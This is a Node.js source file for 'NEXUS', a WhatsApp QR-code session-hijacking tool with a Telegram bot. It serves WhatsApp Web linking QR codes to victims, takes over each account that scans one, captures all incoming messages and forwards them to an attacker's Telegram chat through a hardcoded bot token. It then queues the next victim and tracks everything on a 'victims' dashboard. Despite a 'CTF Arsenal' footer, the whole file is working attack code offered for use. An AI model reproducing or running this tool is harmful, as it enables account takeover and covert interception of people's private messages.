// ============================================================================
// 🔱 NEXUS — WhatsApp QR Hijack + Telegram Bot
// Sesiones múltiples de víctimas, forwarding automático
// ============================================================================
// Dependencias: @whiskeysockets/baileys, qrcode, pino, node-cache
// Arranque:     node src/index.js [port]  (default 42220)
// ============================================================================

const http = require('http');
const url = require('url');
const fs = require('fs');
const path = require('path');
const { makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const QRCode = require('qrcode');
const pino = require('pino')();
const NodeCache = require('node-cache');

// ─── Config ─────────────────────────────────────────────────────────────────
const PORT = parseInt(process.argv[2]) || 42220;
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8232796740:AAFJQCaL4I-06EaqlW3pGGg-LAmM1jkO-mY';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8472077868';
const SESSIONS_DIR = path.join(__dirname, '..', 'sessions');
const AUTH_DIR = path.join(__dirname, '..', 'auth_info');
const DATA_FILE = path.join(__dirname, '..', 'data', 'messages.jsonl');

// Asegurar directorios
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
if (!fs.existsSync(path.join(__dirname, '..', 'data'))) fs.mkdirSync(path.join(__dirname, '..', 'data'), { recursive: true });

// ─── Estado Global ──────────────────────────────────────────────────────────
const sessions = new Map();     // sessionId -> { sock, qr, phone, status, messages[] }
const msgCache = new NodeCache({ stdTTL: 3600, checkperiod: 120 });
let nextSessionId = 1;
let currentQR = null;          // QR actual como data-uri base64
let currentQRSessionId = null; // ID de la sesión que está mostrando el QR

// ─── Telegram Helper ────────────────────────────────────────────────────────
async function sendTelegram(text, parseMode = 'HTML') {
    const maxLen = 4000;
    const chunks = [];
    for (let i = 0; i < text.length; i += maxLen) {
        chunks.push(text.substring(i, i + maxLen));
    }
    for (const chunk of chunks) {
        try {
            const encoded = new URLSearchParams({ chat_id: TELEGRAM_CHAT_ID, text: chunk, parse_mode: parseMode });
            await new Promise((resolve, reject) => {
                const req = http.request(
                    `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
                    { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
                    (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve(d)); }
                );
                req.on('error', reject);
                req.write(encoded.toString());
                req.end();
            });
        } catch (e) {
            console.error('[TELEGRAM ERROR]', e.message);
        }
    }
}

async function sendTelegramPhoto(caption, photoBuffer) {
    // Enviar foto via Telegram (multipart manual)
    // Simplificado: enviamos caption con aviso
    await sendTelegram(`📷 ${caption}\n📎 [Imagen - ver en dashboard]`);
}

// ─── Log a JSONL ────────────────────────────────────────────────────────────
function logMessage(sessionId, phone, from, message, type) {
    const entry = {
        ts: Date.now(),
        sessionId,
        phone,
        from,
        message,
        type,
    };
    fs.appendFileSync(DATA_FILE, JSON.stringify(entry) + '\n');
}

// ─── Crear/Iniciar Sesión Baileys ───────────────────────────────────────────
async function createSession(sessionId) {
    const sessionIdStr = String(sessionId).padStart(3, '0');
    const authDir = path.join(AUTH_DIR, `session_${sessionIdStr}`);

    if (!fs.existsSync(authDir)) fs.mkdirSync(authDir, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(authDir);

    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: true,
        logger: pino,
        browser: ['Chrome (Linux)', '', ''],
        syncFullHistory: false,
        markOnlineOnConnect: false,
        generateHighQualityLinkPreview: false,
        defaultQueryTimeoutMs: 10000,
        keepAliveIntervalMs: 30000,
    });

    const session = {
        id: sessionId,
        sock,
        qr: null,
        phone: null,
        status: 'initializing',
        messages: [],
        created: Date.now(),
    };

    sessions.set(sessionId, session);

    // ─── Event: QR ──────────────────────────────────────────────────────────
    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
        if (qr) {
            session.qr = qr;
            session.status = 'awaiting_scan';
            try {
                currentQR = await QRCode.toDataURL(qr, { width: 400, margin: 2, color: { dark: '#000', light: '#fff' } });
                currentQRSessionId = sessionId;
                console.log(`[S${sessionIdStr}] QR GENERATED — esperando escaneo`);
            } catch (e) {
                console.error('[QR ERROR]', e.message);
            }
        }

        if (connection === 'open') {
            const phone = sock.user?.id?.split(':')[0] || 'unknown';
            session.phone = phone;
            session.status = 'connected';
            currentQR = null;
            currentQRSessionId = null;
            console.log(`[S${sessionIdStr}] ✅ CONECTADO: +${phone}`);

            await sendTelegram(
                `🔗 <b>NUEVA VÍCTIMA CONECTADA</b>\n` +
                `📱 <b>WhatsApp:</b> +${phone}\n` +
                `🆔 <b>Sesión:</b> #${sessionIdStr}\n` +
                `🕐 <b>Conectado:</b> ${new Date().toLocaleString('es-PY')}`
            );

            // Lanzar nueva sesión para siguiente víctima
            setTimeout(() => createSession(nextSessionId++), 2000);
        }

        if (connection === 'close') {
            const reason = lastDisconnect?.error?.message || 'unknown';
            session.status = 'disconnected';
            console.log(`[S${sessionIdStr}] ❌ DESCONECTADO: ${reason}`);

            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log(`[S${sessionIdStr}] ↻ Reconectando...`);
                setTimeout(() => createSession(sessionId), 5000);
            }

            await sendTelegram(
                `⚠️ <b>Sesión #${sessionIdStr} desconectada</b>\n` +
                `📱 +${session.phone || 'desconocido'}\n` +
                `📋 Razón: ${reason}`
            );
        }
    });

    // ─── Event: Messages ────────────────────────────────────────────────────
    sock.ev.on('messages.upsert', async ({ messages: newMsgs, type }) => {
        if (type !== 'notify') return;

        for (const msg of newMsgs) {
            if (msg.key?.fromMe) continue; // Ignorar mensajes enviados por nosotros
            if (!msg.message) continue;

            const from = msg.pushName || msg.key?.remoteJid || 'unknown';
            const phone = session.phone || 'pending';
            let text = '';
            let msgType = 'text';

            if (msg.message?.conversation) {
                text = msg.message.conversation;
            } else if (msg.message?.extendedTextMessage?.text) {
                text = msg.message.extendedTextMessage.text;
            } else if (msg.message?.imageMessage) {
                text = '📷 [Imagen]';
                msgType = 'image';
            } else if (msg.message?.videoMessage) {
                text = '🎬 [Video]';
                msgType = 'video';
            } else if (msg.message?.audioMessage) {
                text = '🎵 [Audio]';
                msgType = 'audio';
            } else if (msg.message?.documentMessage) {
                text = `📄 [Documento: ${msg.message.documentMessage?.fileName || 'desconocido'}]`;
                msgType = 'document';
            } else if (msg.message?.stickerMessage) {
                text = '🏷️ [Sticker]';
                msgType = 'sticker';
            } else if (msg.message?.locationMessage) {
                text = `📍 [Ubicación]`;
                msgType = 'location';
            } else {
                text = `📦 [${Object.keys(msg.message)[0] || 'unknown'}]`;
                msgType = 'other';
            }

            const contactName = from.split('@')[0];
            const entry = { phone, contact: contactName, text, type: msgType, ts: Date.now() };
            session.messages.push(entry);
            logMessage(sessionId, phone, contactName, text, msgType);

            console.log(`[S${sessionIdStr}] 💬 +${phone} → ${contactName}: ${text.substring(0, 80)}`);

            // Forward a Telegram
            const icon = msgType === 'text' ? '💬' : msgType === 'image' ? '📷' : msgType === 'audio' ? '🎵' : '📦';
            await sendTelegram(
                `${icon} <b>WhatsApp — +${phone}</b>\n` +
                `👤 <b>${contactName}</b>\n` +
                `🕐 ${new Date().toLocaleString('es-PY')}\n` +
                `─────────────────\n` +
                `${text.substring(0, 500)}`
            );
        }
    });

    return session;
}

// ─── HTTP Server ────────────────────────────────────────────────────────────
function parseBody(req) {
    return new Promise((resolve) => {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => resolve(body));
    });
}

const server = http.createServer(async (req, res) => {
    const parsed = url.parse(req.url, true);
    const pathname = parsed.pathname;

    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    if (req.method === 'OPTIONS') { res.writeHead(200); res.end(); return; }

    try {
        // ── GET /qr ── Devuelve QR actual como data-uri ───────────────────
        if (pathname === '/qr' && req.method === 'GET') {
            const active = Array.from(sessions.values()).find(s => s.status === 'awaiting_scan' && s.qr);
            const qrData = active ? active.qr : null;

            if (qrData) {
                try {
                    const dataUri = await QRCode.toDataURL(qrData, { width: 400, margin: 2 });
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ qr: dataUri, sessionId: active.id, status: 'awaiting_scan' }));
                } catch (e) {
                    res.writeHead(500, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'QR generation failed', detail: e.message }));
                }
            } else {
                // Verificar si hay sesión en espera o crear una nueva
                const hasWaiting = Array.from(sessions.values()).some(s => s.status === 'awaiting_scan');
                if (!hasWaiting && sessions.size < 10) {
                    createSession(nextSessionId++);
                }
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ qr: null, sessionId: null, status: 'no_qr_available' }));
            }
            return;
        }

        // ── GET /qr-image ── Devuelve el QR como HTML/SVG para incrustar ─
        if (pathname === '/qr-image' && req.method === 'GET') {
            const active = Array.from(sessions.values()).find(s => s.status === 'awaiting_scan' && s.qr);
            const qrData = active ? active.qr : null;

            if (qrData) {
                try {
                    const dataUri = await QRCode.toDataURL(qrData, { width: 400, margin: 2 });
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(`<img src="${dataUri}" alt="QR WhatsApp" style="width:280px;height:280px;image-rendering:pixelated">`);
                } catch (e) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end('<div style="width:280px;height:280px;display:flex;align-items:center;justify-content:center;background:#1a1a2e;color:#555;font-family:sans-serif;font-size:12px">⌛ Generando QR...</div>');
                }
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end('<div style="width:280px;height:280px;display:flex;align-items:center;justify-content:center;background:#1a1a2e;color:#555;font-family:sans-serif;font-size:12px">⌛ Esperando Baileys...</div>');
            }
            return;
        }

        // ── GET /status ── Estado del sistema ────────────────────────────
        if (pathname === '/status' && req.method === 'GET') {
            const sessionsInfo = Array.from(sessions.entries()).map(([id, s]) => ({
                id,
                phone: s.phone || 'pending',
                status: s.status,
                messages: s.messages.length,
                uptime: Math.floor((Date.now() - s.created) / 1000),
            }));

            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                total_sessions: sessions.size,
                active_sessions: sessionsInfo.filter(s => s.status === 'connected').length,
                waiting_for_scan: sessionsInfo.filter(s => s.status === 'awaiting_scan').length,
                total_messages: Array.from(sessions.values()).reduce((a, s) => a + s.messages.length, 0),
                sessions: sessionsInfo,
                main_qr_active: currentQRSessionId !== null,
            }));
            return;
        }

        // ── GET /sessions ── Lista detallada de sesiones ────────────────
        if (pathname === '/sessions' && req.method === 'GET') {
            const sessionsInfo = Array.from(sessions.entries()).map(([id, s]) => ({
                id,
                phone: s.phone || '⏳ Pendiente',
                status: s.status,
                messages: s.messages.length,
                last_seen: s.messages.length > 0 ? s.messages[s.messages.length - 1].ts : null,
            }));
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify(sessionsInfo, null, 2));
            return;
        }

        // ── GET /messages/:phone ── Mensajes de una sesión ──────────────
        const msgMatch = pathname.match(/^\/messages\/(.+)$/);
        if (msgMatch && req.method === 'GET') {
            const phone = msgMatch[1];
            const session = Array.from(sessions.values()).find(s => s.phone === phone);
            if (session) {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(session.messages.slice(-100), null, 2));
            } else {
                res.writeHead(404, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'Session not found' }));
            }
            return;
        }

        // ── GET / -- Dashboard HTML ──────────────────────────────────────
        if (pathname === '/' || pathname === '/dashboard') {
            const sessionsInfo = Array.from(sessions.values()).map(s => ({
                phone: s.phone || '⏳ Pendiente',
                status: s.status,
                messages: s.messages.length,
                lastMsg: s.messages.length > 0 ? s.messages[s.messages.length - 1] : null,
            }));

            const activeSessions = sessionsInfo.filter(s => s.status === 'connected');
            const pendingQR = sessionsInfo.filter(s => s.status === 'awaiting_scan');

            let rows = sessionsInfo.map(s => `
                <tr>
                    <td>${s.phone}</td>
                    <td><span class="status ${s.status}">${s.status}</span></td>
                    <td>${s.messages}</td>
                    <td>${s.lastMsg ? s.lastMsg.text.substring(0, 40) : '-'}</td>
                </tr>
            `).join('');

            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>NEXUS — WhatsApp Hijack Dashboard</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0a;color:#e0e0e0;padding:20px}
        h1{color:#00ff88;font-size:24px;margin-bottom:20px}
        .stats{display:flex;gap:15px;margin-bottom:25px;flex-wrap:wrap}
        .stat{background:#1a1a2e;padding:15px 20px;border-radius:8px;border:1px solid #2a2a4e;min-width:120px}
        .stat .num{font-size:28px;font-weight:bold;color:#00ff88}
        .stat .label{font-size:12px;color:#888;margin-top:4px}
        table{width:100%;border-collapse:collapse;background:#12121a;border-radius:8px;overflow:hidden}
        th{background:#1a1a2e;padding:10px 15px;text-align:left;font-size:13px;color:#888;border-bottom:1px solid #2a2a4e}
        td{padding:10px 15px;border-bottom:1px solid #1a1a2e;font-size:14px}
        .status{display:inline-block;padding:3px 10px;border-radius:12px;font-size:12px;font-weight:600}
        .status.connected{background:#00ff8822;color:#00ff88;border:1px solid #00ff8844}
        .status.awaiting_scan{background:#ffaa0022;color:#ffaa00;border:1px solid #ffaa0044}
        .status.initializing{background:#4488ff22;color:#4488ff;border:1px solid #4488ff44}
        .status.disconnected{background:#ff444422;color:#ff4444;border:1px solid #ff444444}
        .qr-section{background:#1a1a2e;border-radius:8px;padding:20px;margin-bottom:25px;text-align:center;border:1px solid #2a2a4e}
        .qr-section img{width:280px;height:280px;image-rendering:pixelated;border-radius:4px}
        .refresh-btn{background:#00ff88;color:#000;border:none;padding:8px 20px;border-radius:6px;font-weight:600;cursor:pointer;margin-top:10px}
        .refresh-btn:hover{background:#00cc66}
        .footer{text-align:center;margin-top:30px;font-size:12px;color:#555}
    </style>
</head>
<body>
    <h1>🔱 NEXUS — WhatsApp Hijack</h1>
    
    <div class="qr-section" id="qrSection">
        <div id="qrContainer">
            <p style="color:#888;margin-bottom:10px">📷 Escanea con WhatsApp para conectar</p>
            <img id="qrImage" src="/qr-image" alt="QR Cargando...">
        </div>
        <button class="refresh-btn" onclick="refreshQR()">🔄 Refrescar QR</button>
        <p id="qrStatus" style="font-size:12px;color:#888;margin-top:8px"></p>
    </div>

    <div class="stats">
        <div class="stat"><div class="num">${activeSessions.length}</div><div class="label">Víctimas Conectadas</div></div>
        <div class="stat"><div class="num">${pendingQR.length}</div><div class="label">Esperando Scan</div></div>
        <div class="stat"><div class="num">${sessionsInfo.reduce((a,s) => a+s.messages, 0)}</div><div class="label">Mensajes Capturados</div></div>
        <div class="stat"><div class="num">${sessionsInfo.length}</div><div class="label">Sesiones Totales</div></div>
    </div>

    <table>
        <thead><tr><th>Víctima</th><th>Estado</th><th>Mensajes</th><th>Último Mensaje</th></tr></thead>
        <tbody>${rows || '<tr><td colspan="4" style="text-align:center;color:#555">Sin sesiones aún</td></tr>'}</tbody>
    </table>
    
    <div class="footer">
        🔱 NEXUS CTF Arsenal v2.0 — WhatsApp Hijack + Telegram Bot
    </div>

    <script>
        function refreshQR() {
            const img = document.getElementById('qrImage');
            const status = document.getElementById('qrStatus');
            const ts = new Date().getTime();
            img.src = '/qr-image?t=' + ts;
            status.textContent = '🔄 Refrescando QR...';
            setTimeout(() => { status.textContent = '✅ QR actualizado — escanea con WhatsApp'; }, 500);
        }
        setInterval(refreshQR, 10000); // Auto-refresh cada 10s
    </script>
</body>
</html>`);
            return;
        }

        // ── 404 ──
        res.writeHead(404, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Not found', paths: ['/qr', '/qr-image', '/status', '/sessions', '/messages/:phone', '/dashboard'] }));

    } catch (e) {
        console.error('[HTTP ERROR]', e);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: e.message }));
    }
});

// ─── Arranque ───────────────────────────────────────────────────────────────
async function start() {
    console.log(`\n`);
    console.log(`╔══════════════════════════════════════════╗`);
    console.log(`║  🔱 NEXUS — WhatsApp Hijack Service      ║`);
    console.log(`║  Puerto: ${PORT}                           `);
    console.log(`║  Telegram: @Fumazabot                     ║`);
    console.log(`╚══════════════════════════════════════════╝\n`);

    // Iniciar primera sesión
    createSession(nextSessionId++);

    server.listen(PORT, '127.0.0.1', () => {
        console.log(`[HTTP] Servidor interno en http://127.0.0.1:${PORT}`);
        console.log(`[HTTP] Endpoints:`);
        console.log(`       GET /qr          → QR como data-uri JSON`);
        console.log(`       GET /qr-image    → QR como HTML <img>`);
        console.log(`       GET /status      → Estado del sistema`);
        console.log(`       GET /sessions    → Lista de sesiones`);
        console.log(`       GET /dashboard   → Dashboard Web`);
        console.log(`       GET /messages/:phone → Mensajes de una sesión`);
        console.log(`\n[TELEGRAM] Bot activo — forwarding activado\n`);
    });
}

start().catch(e => {
    console.error('[FATAL]', e);
    process.exit(1);
});
